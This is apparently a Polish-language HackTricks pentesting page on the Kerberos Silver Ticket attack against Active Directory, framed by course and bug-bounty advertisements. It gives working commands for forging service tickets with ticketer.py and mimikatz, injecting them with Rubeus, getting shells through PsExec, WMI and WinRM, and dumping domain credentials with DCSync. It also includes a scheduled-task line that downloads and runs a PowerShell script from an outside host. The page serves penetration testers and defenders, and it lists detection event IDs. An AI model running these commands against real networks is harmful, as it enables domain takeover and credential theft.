# Bilet srebrny

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Wskazówka dotycząca nagrody za błąd**: **Zarejestruj się** na platformie **Intigriti**, premium **platformie nagród za błędy stworzonej przez hakerów, dla hakerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody aż do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Bilet srebrny

Atak **Bilet srebrny** polega na wykorzystaniu biletów usług w środowiskach Active Directory (AD). Ta metoda polega na **uzyskaniu hasha NTLM konta usługi**, takiego jak konto komputera, w celu sfałszowania biletu Granting Service (TGS). Dzięki temu sfałszowanemu biletowi atakujący może uzyskać dostęp do określonych usług w sieci, **podając się za dowolnego użytkownika**, zwykle dążąc do uzyskania uprawnień administracyjnych. Podkreśla się, że używanie kluczy AES do fałszowania biletów jest bardziej bezpieczne i mniej wykrywalne.

Do tworzenia biletów używane są różne narzędzia w zależności od systemu operacyjnego:

### Na Linuxie
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Na Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
## Dostępne Usługi

| Rodzaj Usługi                              | Bilety Silver dla Usługi                                                |
| ------------------------------------------ | ----------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>W zależności od systemu operacyjnego także:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>W niektórych przypadkach można po prostu poprosić o: WINRM</p> |
| Zadania Zaplanowane                        | HOST                                                                   |
| Windows File Share, również psexec          | CIFS                                                                   |
| Operacje LDAP, w tym DCSync                | LDAP                                                                   |
| Narzędzia Administracji Zdalnej Serwera Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                     |
| Golden Tickets                             | krbtgt                                                                 |

Za pomocą **Rubeus** możesz **poprosić o wszystkie** te bilety, używając parametru:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### ID Wydarzeń dla Biletów Silver

* 4624: Logowanie do Konta
* 4634: Wylogowanie z Konta
* 4672: Logowanie Administratora

## Nadużywanie Biletów Usług

W poniższych przykładach załóżmy, że bilet został pozyskany poprzez podszywanie się pod konto administratora.

### CIFS

Dzięki temu biletowi będziesz mógł uzyskać dostęp do folderów `C$` i `ADMIN$` za pomocą **SMB** (jeśli są one dostępne) i skopiować pliki do części systemu plików zdalnego wykonując coś w rodzaju:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
### HOST

Z tym uprawnieniem możesz generować zaplanowane zadania na zdalnych komputerach i wykonywać dowolne polecenia:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Z tymi biletami możesz **wykonać WMI w systemie ofiary**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Znajdź **więcej informacji o wmiexec** na następnej stronie:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Z dostępem winrm do komputera możesz **uzyskać do niego dostęp** i nawet uruchomić PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Sprawdź następną stronę, aby dowiedzieć się **więcej sposobów łączenia się z hostem zdalnym za pomocą winrm**:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Zauważ, że **winrm musi być aktywny i nasłuchiwać** na zdalnym komputerze, aby uzyskać do niego dostęp.
{% endhint %}

### LDAP

Z tym uprawnieniem możesz wykonać zrzut bazy danych DC za pomocą **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Dowiedz się więcej o DCSync** na następnej stronie:

## Referencje

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Wskazówka dotycząca bug bounty**: **Zarejestruj się** na platformie bug bounty **Intigriti**, stworzonej przez hakerów, dla hakerów! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody aż do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
